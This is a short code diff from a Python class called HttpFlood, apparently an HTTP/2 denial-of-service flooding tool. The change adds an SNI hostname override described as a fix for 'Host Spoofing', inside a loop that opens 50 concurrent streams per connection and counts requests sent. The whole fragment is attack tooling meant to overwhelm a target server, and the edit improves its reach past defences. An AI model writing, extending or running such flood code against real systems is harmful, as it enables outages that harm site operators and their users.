@@ -1640,7 +1640,8 @@ class HttpFlood(Thread):
                 client = self._h2_client
             # [PHASE 15] High-Intensity Multiplexing (50 concurrent streams per connection)
             for _ in range(50): 
-                with client.stream("GET", clean_target_url) as resp:
+                # [PHASE 15] SNI Fix for Host Spoofing: Ensure SSL handshake uses domain, not IP
+                with client.stream("GET", clean_target_url, extensions={"sni_hostname": target_domain}) as resp:
                     CONNECTIONS_SENT += 1
                     REQUESTS_SENT += 1
                     TOTAL_REQUESTS_SENT += 1
